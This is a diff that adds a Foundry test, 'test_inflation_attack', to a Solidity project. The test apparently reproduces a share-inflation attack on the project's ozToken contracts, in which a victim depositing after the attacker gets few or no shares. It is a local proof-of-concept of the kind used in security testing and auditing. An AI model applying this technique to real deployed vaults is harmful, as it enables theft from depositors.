@@ -5,6 +5,8 @@ pragma solidity 0.8.21;
 import {IERC20Permit} from "../../contracts/interfaces/IERC20Permit.sol";
 import {Asset} from "../../contracts/AppStorage.sol";
 import {TestMethods} from "./TestMethods.sol";
+import {ozIToken} from "../../contracts/interfaces/ozIToken.sol";
+import {Type} from "./AppStorageTests.sol";
 
 import "forge-std/console.sol";
 
@@ -24,7 +26,42 @@ contract OtherTests is TestMethods {
     }
 
 
-    
+    function test_inflation_attack() public {
+        _dealUnderlying(Quantity.BIG);
+        uint amountIn = 1000000;
+
+        (ozIToken ozERC20, uint sharesAlice) = _createAndMintOzTokens(
+            testToken, amountIn, alice, ALICE_PK, true, false, Type.IN
+        );
+
+        uint balAlice = ozERC20.balanceOf(alice);
+
+        console.log('sharesAlice: ', sharesAlice);
+        console.log('balAlice: ', balAlice);
+
+        //--------
+        console.log('--- begin attack ---');
+        amountIn = 10_000e18 - 1;
+
+        _createAndMintOzTokens(
+            address(ozERC20), amountIn, alice, ALICE_PK, false, true, Type.IN
+        );
+        console.log('--- attack finished ---');
+        //--------
+
+        amountIn = 19999e18;
+        (, uint sharesCharlie) = _createAndMintOzTokens(
+            address(ozERC20), amountIn, charlie, CHARLIE_PK, false, true, Type.IN
+        );
+
+        uint balVictim = ozERC20.balanceOf(charlie);
+        
+        console.log('balVictim: ', balVictim);
+        console.log('shares victim: ', sharesCharlie);
+
+        
+
+    }
 
 
 }
